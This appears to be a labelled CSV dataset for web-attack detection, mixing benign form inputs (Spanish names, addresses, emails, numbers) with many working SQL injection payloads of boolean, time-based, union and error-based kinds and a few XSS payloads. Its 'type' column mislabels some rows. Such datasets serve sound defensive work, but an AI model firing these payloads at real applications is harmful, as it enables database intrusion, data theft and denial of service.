Text,attack_type,Label,type
detlefsen albornoz,norm,0,normal
leuco vilca,norm,0,normal
"1""))) and 7533=7533 and (((""xopd""=""xopd",sqli,1,normal
emberrincharse,norm,0,normal
bonil schettino,norm,0,normal
"1'||(select 'glec' from dual where 4846=4846;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"-3913"" where 6085=6085 union all select 6085,6085,6085,6085,6085,6085,6085#",sqli,1,sql
"-1559 union all select 3985,3985,3985,3985#",sqli,1,sql
porta cruz de arqueros 145,norm,0,normal
"1'+(select ounb where 4653=4653 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))+'",sqli,1,sql
janna,norm,0,normal
gilan@escarba.fk,norm,0,normal
"-7923"")) or make_set(9354=9354,7185) and ((""szct""=""szct",sqli,1,normal
"1'))) and elt(9041=6421,6421) and ((('ixxg' like 'ixxg",sqli,1,normal
altafulla,norm,0,normal
"1 or elt(6272=6272,sleep(5))",sqli,1,normal
"1') and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
78695182s,norm,0,normal
destriana,norm,0,normal
"1%""))) or 6793=(select 6793 from pg_sleep(5)) and (((""%""=""",sqli,1,sql
"-9922')) union all select 2193,2193,2193--",sqli,1,sql
07260,norm,0,normal
02100,norm,0,normal
"1"")) as xxdm where 4818=4818;begin dbms_lock.sleep(5); end--",sqli,1,sql
"-2423'))) union all select 8256,8256,8256,8256,8256,8256,8256,8256--",sqli,1,sql
"1%'))) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
69671861p,norm,0,normal
"-3834'))) union all select 8313,8313--",sqli,1,sql
"1)) as tuxy where 6855=6855 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"1)) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((3003=3003",sqli,1,sql
crovetto roger,norm,0,normal
8485680523829523,norm,0,normal
"1) as zmjm where 9125=9125 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
"-4304' where 1005=1005 union all select 1005,1005#",sqli,1,sql
8406156638357401,norm,0,normal
alcojor larenas,norm,0,normal
buitrago pontigo,norm,0,normal
casillas de flores,norm,0,normal
melanson,norm,0,normal
"1%'))) and elt(4249=4249,7259) and ((('%'='",sqli,1,normal
"(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,1,sql
"1"") where 3826=3826;select count(*) from generate_series(1,5000000)--",sqli,1,sql
castrono,norm,0,normal
quiyen,norm,0,normal
"da roseira s/n, 7a",norm,0,normal
julieta,norm,0,normal
2esco63enti2,norm,0,normal
m+ar8ca4,norm,0,normal
ulf,norm,0,normal
lupin colombo,norm,0,normal
darice,norm,0,normal
fgols,norm,0,normal
24175,norm,0,normal
e50land5cer,norm,0,normal
-2625')) or 3038=3038,sqli,1,normal
"1') where 1646=1646 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
compatrn,norm,0,normal
6908395975475086,norm,0,normal
"baixada carme, 165, 3?e",norm,0,normal
1' and 2006=2006,sqli,1,normal
fady,norm,0,normal
"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",sqli,1,sql
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))-- dkwz",sqli,1,sql
"-6505')) as jtnp where 1037=1037 or elt(1032=1032,3623)--",sqli,1,sql
afasia,norm,0,normal
04176,norm,0,normal
-8234'))) or 9323=9323#,sqli,1,normal
(select 2412=('qqpjq'||(select case 2412 when 2412 then 1 else 0 end from rdb$database)||'qzvzq')),sqli,1,sql
nail,norm,0,normal
comu793ta,norm,0,normal
"<script <b>=alert('xss');""></script>",xss,2,xss
9857,norm,0,normal
aborr-ascarse,norm,0,normal
"1%"") and make_set(9956=1060,1060) and (""%""=""",sqli,1,normal
sempronia,norm,0,normal
"1'+(select 'plcm' where 2141=2141 and elt(3114=3114,sleep(5))#",sqli,1,sql
de5pi6ar4za4,norm,0,normal
89208475p,norm,0,normal
2657051536857190,norm,0,normal
"1%""));select case when 5308=6745 then 1 else null end--",sqli,1,sql
75834762j,norm,0,normal
16435,norm,0,normal
3771,norm,0,normal
buciegas,norm,0,normal
sikander,norm,0,normal
anariva estradera,norm,0,normal
"1"" where 7380=7380 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
52946142g,norm,0,normal
"1%""))) waitfor delay '0:0:5'--",sqli,1,sql
-3937)) or 3038=3038,sqli,1,normal
"1%""))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((""%""=""",sqli,1,sql
lawlik@housemovie.lk,norm,0,normal
"1"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""dskh""=""dskh",sqli,1,sql
gelde pajares,norm,0,normal
"1%"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""%""=""",sqli,1,sql
1)) and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
85855294c,norm,0,normal
"1 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",sqli,1,sql
brines grimalda,norm,0,normal
6135315526614967,norm,0,normal
"rua picouto, 14,",norm,0,normal
montmany,norm,0,normal
43141809l,norm,0,normal
1')) or sleep(5) and (('taaj'='taaj,sqli,1,normal
"calle mariano garcia, s/n",norm,0,normal
"1') where 8204=8204;select count(*) from generate_series(1,5000000)--",sqli,1,sql
sertino,norm,0,normal
bears,norm,0,normal
54,norm,0,normal
1076281892196513,norm,0,normal
alegra,norm,0,normal
villar de caas,norm,0,normal
"1%"") and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""%""=""",sqli,1,sql
pierfederici@softstylestudio.ls,norm,0,normal
don juan 126,norm,0,normal
"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""rdri""=""rdri",sqli,1,sql
balcells parets,norm,0,normal
"1') as jxqt where 4322=4322 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
bruscate,norm,0,normal
"1' in boolean mode) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)#",sqli,1,sql
celka,norm,0,normal
estable,norm,0,normal
17130,norm,0,normal
8328,norm,0,normal
1 where 4153=4153 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
"1"") where 2473=2473 and make_set(6118=7684,7684)--",sqli,1,sql
3609841962548925,norm,0,normal
jubinvil,norm,0,normal
caminero carreo,norm,0,normal
"1"") as jmwr where 5978=5978 rlike (select (case when (1396=8762) then 1 else 0x28 end))--",sqli,1,sql
8652159260069074,norm,0,normal
legris@beautifulbody.yu,norm,0,normal
elido,norm,0,normal
"1 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
38948590e,norm,0,normal
bowen-gugolka@soyriojano.name,norm,0,normal
rebengivc@somosagelespaa.ie,norm,0,normal
c/ pampa 76,norm,0,normal
"1%""))) order by 1#",sqli,1,normal
suspen3edo7,norm,0,normal
6264,norm,0,normal
"-1808%"")) or 4595=3545 and ((""%""=""",sqli,1,normal
raimulfo,norm,0,normal
"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",sqli,1,sql
97llami+ento,norm,0,normal
21840329n,norm,0,normal
monegrillo,norm,0,normal
dbra,norm,0,normal
"1%') procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
"-4136')) as cczp where 7052=7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",sqli,1,sql
2a0ch95,norm,0,normal
1%';select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
9867,norm,0,normal
caridad,norm,0,normal
descorts,norm,0,normal
"1' in boolean mode) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)#",sqli,1,sql
guerreiro@arroyo-molinos.je,norm,0,normal
sant jaume de llierca,norm,0,normal
-7874))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((2817=2817,sqli,1,sql
"-8369"")) union all select 2191--",sqli,1,sql
tortuero,norm,0,normal
limpi$aas,norm,0,normal
"1"") or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
-1700%' or 4149=3391#,sqli,1,normal
1') waitfor delay '0:0:5'--,sqli,1,sql
"1"") as esks where 1138=1138;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
puellas sarlinga,norm,0,normal
"calle periodista fray antonio de la chica, s/n 9e",norm,0,normal
"1' where 6135=6135;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
1 rlike (select * from (select(sleep(5)))sgvo)# ewsz,sqli,1,sql
"1""));waitfor delay '0:0:5' and ((""zili"" like ""zili",sqli,1,sql
5956391095896498,norm,0,normal
"1')) as jmnw where 6496=6496 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
18,norm,0,normal
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",sqli,1,sql
"linares, 42",norm,0,normal
vigoda5@fotoseroticas.com.ae,norm,0,normal
ruesga,norm,0,normal
"-3769""))) union all select 8456#",sqli,1,sql
leiro,norm,0,normal
deolinda,norm,0,normal
1 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# odvp,sqli,1,sql
1;select pg_sleep(5)--,sqli,1,sql
ocelot,norm,0,normal
"1""))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""zzcd""=""zzcd",sqli,1,sql
"praza san antonio da florida, 27,",norm,0,normal
"calle bruno ayllon, 142, 3?c",norm,0,normal
">""<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>",xss,2,sql
mcmurray,norm,0,normal
artista,norm,0,normal
"-9175')) union all select 6174,6174,6174,6174--",sqli,1,sql
54716363f,norm,0,normal
"calle tulipanes 151, 9?d",norm,0,normal
26191,norm,0,normal
"calle pintor picasso, 182 5?d",norm,0,normal
boget brufau,norm,0,normal
"1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('ekla'='ekla",sqli,1,sql
reluchar,norm,0,normal
"1'||(select 'rawn' from dual where 4988=4988 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))||'",sqli,1,sql
"-8200' where 3422=3422 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"-1585%"")) union all select 8818,8818,8818,8818,8818,8818#",sqli,1,sql
47939000p,norm,0,normal
44t4mpad6,norm,0,normal
1'))) or sleep(5)#,sqli,1,normal
05591,norm,0,normal
50535908d,norm,0,normal
"-3566' where 3641=3641 union all select 3641,3641,3641,3641,3641#",sqli,1,sql
1';select pg_sleep(5)--,sqli,1,sql
-4104%' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and '%'=',sqli,1,sql
ianace,norm,0,normal
7930754215612383,norm,0,normal
alconchel,norm,0,normal
camponaraya,norm,0,normal
desp2li52ado5,norm,0,normal
1'+(select 'vtyw' where 7950=7950 order by 1--,sqli,1,sql
1)) as rcbz where 4563=4563 and 2006=2006,sqli,1,normal
"-4528"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""fxmt"" like ""fxmt",sqli,1,sql
"1')) as qaki where 5272=5272;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
39509298j,norm,0,normal
3329811136161981,norm,0,normal
esmil42291,norm,0,normal
casper,norm,0,normal
narros de matalayegua,norm,0,normal
7966926695826035,norm,0,normal
"1' union all select null,null,null,null--",sqli,1,sql
"1"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
alcantud,norm,0,normal
1) where 1527=1527 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
-8684' where 9820=9820 or 6844=5105,sqli,1,normal
3916,norm,0,normal
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,sql
wamba,norm,0,normal
"1"")) as qhnb where 8302=8302 and (3020=3020)*6703--",sqli,1,sql
3880938788805170,norm,0,normal
6702564951251728,norm,0,normal
de_leon,norm,0,normal
juradera,norm,0,normal
arcediano,norm,0,normal
5719365905876928,norm,0,normal
1) and 8417=5276#,sqli,1,normal
0381793087157958,norm,0,normal
"c/ relfas 122,",norm,0,normal
downs,norm,0,normal
"1%'))) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"blasco de garay, 168,",norm,0,normal
adahuesca,norm,0,normal
79533872x,norm,0,normal
datario,norm,0,normal
sanderson@todobetis.ml,norm,0,normal
"1 and elt(1210=1210,sleep(5))",sqli,1,normal
"-6405' union all select 8235,8235,8235,8235,8235#",sqli,1,sql
"1' and elt(4249=4249,7259) and 'nsbj' like 'nsbj",sqli,1,normal
tenuta,norm,0,normal
"-5591%"")) order by 1--",sqli,1,sql
1)) or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
"1)) as uizx where 2512=2512 and make_set(1402=2908,2908)--",sqli,1,sql
comport8ble,norm,0,normal
"1)) union all select null,null,null,null,null,null,null--",sqli,1,sql
1467,norm,0,normal
thiel,norm,0,normal
01193,norm,0,normal
1)));(select * from (select(sleep(5)))acdk)#,sqli,1,sql
78102d84!am1nte,norm,0,normal
"1"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""udlh""=""udlh",sqli,1,sql
1798713909636768,norm,0,normal
5658181511648002,norm,0,normal
"-1550%""))) order by 1--",sqli,1,sql
"1' and elt(4249=4249,7259) and 'pgvz'='pgvz",sqli,1,normal
corazoncill2,norm,0,normal
15691,norm,0,normal
"1' in boolean mode) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)#",sqli,1,normal
"plza. magallanes, 50",norm,0,normal
"1,(select (case when (6857=7623) then 1 else 6857*(select 6857 from information_schema.character_sets) end))",sqli,1,sql
"1%"" and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""",sqli,1,sql
egner,norm,0,normal
bril?l7du4a,norm,0,normal
17707,norm,0,normal
trela@ajuntamentdebarcelona20.tk,norm,0,normal
"1) or elt(5873=5873,sleep(5))#",sqli,1,normal
konstanc,norm,0,normal
yaonan,norm,0,normal
roboracin,norm,0,normal
-4215) where 5782=5782 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
irua oka/irua de oca,norm,0,normal
4823192107223935,norm,0,normal
1') rlike (select (case when (7447=3981) then 1 else 0x28 end)),sqli,1,sql
"1%""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"1%"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""%""=""",sqli,1,sql
ondorica arabia,norm,0,normal
f36hu1a,norm,0,normal
"pl. pintor salvador soria 20,",norm,0,normal
1') and (select * from (select(sleep(5)))fzno) and ('eqfh'='eqfh,sqli,1,sql
"-7518"" or elt(8413=3995,3995) and ""cpnf""=""cpnf",sqli,1,normal
"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",sqli,1,sql
-6200%')) or 8077=4661,sqli,1,normal
90e_mpr365v0,norm,0,normal
2641897026324485,norm,0,normal
91392378s,norm,0,normal
6el24a,norm,0,normal
31587,norm,0,normal
escobedo,norm,0,normal
saj.ador,norm,0,normal
2243286657629383,norm,0,normal
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'uwep'='uwep",sqli,1,normal
"fundidores, 179,",norm,0,normal
regazo,norm,0,normal
muenster@introito.th,norm,0,normal
1');select pg_sleep(5) and ('vnss' like 'vnss,sqli,1,sql
40234,norm,0,normal
puente del congosto,norm,0,normal
1')) as mbzk where 9153=9153 and 2006=2006,sqli,1,normal
avantrn,norm,0,normal
pl. juan xxiii 197,norm,0,normal
"1%"") or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
"1"" where 7045=7045;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
gorostidi ponce,norm,0,normal
-t6a1niet7,norm,0,normal
itziar,norm,0,normal
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",sqli,1,sql
94335965q,norm,0,normal
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""jtgs"" like ""jtgs",sqli,1,sql
opaline,norm,0,normal
ginette,norm,0,normal
demias,norm,0,normal
forfoleda,norm,0,normal
calle rafael villa 41,norm,0,normal
stetson,norm,0,normal
1') where 8429=8429;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
noely,norm,0,normal
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('xaoi'='xaoi",sqli,1,sql
alarico,norm,0,normal
"1'+(select ummn where 8883=8883 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+'",sqli,1,sql
"1"" rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ""qfhv""=""qfhv",sqli,1,sql
"-1707) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (7756=7756",sqli,1,sql
1))) and 6969=(select 6969 from pg_sleep(5)) and (((5333=5333,sqli,1,sql
"1'+(select pwvr where 3028=3028 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
50549,norm,0,normal
-2891 where 1770=1770 or 9290=5866,sqli,1,normal
bradney4,norm,0,normal
477dj6r,norm,0,normal
pipponzi,norm,0,normal
"1""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""oohx"" like ""oohx",sqli,1,normal
21890,norm,0,normal
-7742) as tgzq where 7842=7842 or 2062=1563,sqli,1,normal
4urr3at9,norm,0,normal
cunanan,norm,0,normal
pujal vilalta,norm,0,normal
77714009e,norm,0,normal
24892,norm,0,normal
11804986y,norm,0,normal
"1"") where 2136=2136 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
muente monfulle,norm,0,normal
"hoyo de pinares, el",norm,0,normal
jalance,norm,0,normal
"1"") as rcnk where 1800=1800;select sleep(5)--",sqli,1,sql
54310177r,norm,0,normal
ardis,norm,0,normal
"c/ estornino s/n, 9f",norm,0,normal
"1"") union all select null,null,null,null,null#",sqli,1,sql
4497,norm,0,normal
1') as jlae where 1650=1650;begin user_lock.sleep(5); end--,sqli,1,sql
"1%"" union all select null,null,null,null--",sqli,1,sql
"calle xiquets de valls, 138, 5?g",norm,0,normal
carrique orri,norm,0,normal
1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('gsjp'='gsjp,sqli,1,sql
plaa del pi 126 11?g,norm,0,normal
1;begin user_lock.sleep(5); end,sqli,1,sql
"1')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('bgdp'='bgdp",sqli,1,sql
1)) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((6406=6406,sqli,1,sql
asisia,norm,0,normal
"1)))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((3023=3023",sqli,1,sql
06519,norm,0,normal
4350,norm,0,normal
cifuentes masloski,norm,0,normal
nicolo,norm,0,normal
breanne,norm,0,normal
"1"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""ubvd""=""ubvd",sqli,1,normal
"1) where 5261=5261 and elt(1210=1210,sleep(5))--",sqli,1,sql
1';(select * from (select(sleep(5)))acdk)#,sqli,1,sql
28194,norm,0,normal
mullin@gopersonaltrainers.nr,norm,0,normal
perras,norm,0,normal
vilamasa pacheca,norm,0,normal
"-6381%"" or 8571=8571--",sqli,1,sql
7277765230207053,norm,0,normal
hocutt,norm,0,normal
icahel,norm,0,normal
kiley,norm,0,normal
"copons, 11",norm,0,normal
capers@innovaris.fr,norm,0,normal
0669143201019058,norm,0,normal
28760,norm,0,normal
castilblanco,norm,0,normal
"calle vereda del carmen, 160 11-e",norm,0,normal
briseboi,norm,0,normal
"<embed src=""data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg=="" type=""image/svg+xml"" allowscriptaccess=""always""></embed>",xss,2,sql
albida,norm,0,normal
"1')));select count(*) from generate_series(1,5000000) and ((('xori' like 'xori",sqli,1,sql
"1' and 8407=(select count(*) from generate_series(1,5000000)) and 'wytg'='wytg",sqli,1,sql
adalgisa,norm,0,normal
4344811902014577,norm,0,normal
"1""))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (((""dzse""=""dzse",sqli,1,sql
albets vilar,norm,0,normal
"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",sqli,1,normal
"1',(select 6825 from(select count(*),concat(0x7171706a71,(select (elt(6825=6825,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
"joyosa, la",norm,0,normal
"-5702'))) union all select 7806,7806,7806,7806,7806--",sqli,1,sql
011a88d4d,norm,0,normal
roncha,norm,0,normal
muehle,norm,0,normal
carraleja,norm,0,normal
brittani,norm,0,normal
0992218178104844,norm,0,normal
9766800722499068,norm,0,normal
6785,norm,0,normal
49181,norm,0,normal
"c/ ortiz de zuiga, 8,",norm,0,normal
smethurst-salvador@mcrspain.vn,norm,0,normal
minako,norm,0,normal
32797115n,norm,0,normal
1%' and 2006=2006,sqli,1,normal
badger,norm,0,normal
"1));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((7700=7700",sqli,1,sql
1 where 7299=7299 rlike sleep(5)--,sqli,1,sql
"1%"");select pg_sleep(5)--",sqli,1,sql
souren,norm,0,normal
tolera9lemen8e,norm,0,normal
1'))) and (3020=3020)*6703 and ((('nhrc' like 'nhrc,sqli,1,normal
03871,norm,0,normal
rond,norm,0,normal
"1'||(select 'wqmz' where 6400=6400 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'",sqli,1,sql
50136,norm,0,normal
"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",sqli,1,sql
virhuez prats,norm,0,normal
villena,norm,0,normal
"1 where 6965=6965 and elt(3933=1232,1232)--",sqli,1,sql
"-5245' or elt(1032=1032,3623) and 'qfvo'='qfvo",sqli,1,normal
-8760) where 8277=8277 union all select 8277--,sqli,1,sql
lap,norm,0,normal
cigales,norm,0,normal
koichi,norm,0,normal
"1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and 'tuzl'='tuzl",sqli,1,sql
lafayette@vitalhome.hk,norm,0,normal
22001,norm,0,normal
"1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,sql
ermin,norm,0,normal
1)) as xlww where 5844=5844;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
consalve,norm,0,normal
46120,norm,0,normal
9743272565251068,norm,0,normal
siede@comodepilarse.ye,norm,0,normal
1')) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (('uqfs'='uqfs,sqli,1,sql
"1 where 4477=4477 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
asan8,norm,0,normal
missy,norm,0,normal
"1' and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
regla casiano,norm,0,normal
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('beoh'='beoh",sqli,1,normal
berni aizpuru,norm,0,normal
rory,norm,0,normal
"1%')) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
benigni@viajesdacapalla.pa,norm,0,normal
"calle del mercat, 153, 7e",norm,0,normal
sorzano,norm,0,normal
1') as yyyb where 1705=1705 and (8770=6988)*6988--,sqli,1,sql
padr pavajeau,norm,0,normal
alcal de la vega,norm,0,normal
7o30s5si7,norm,0,normal
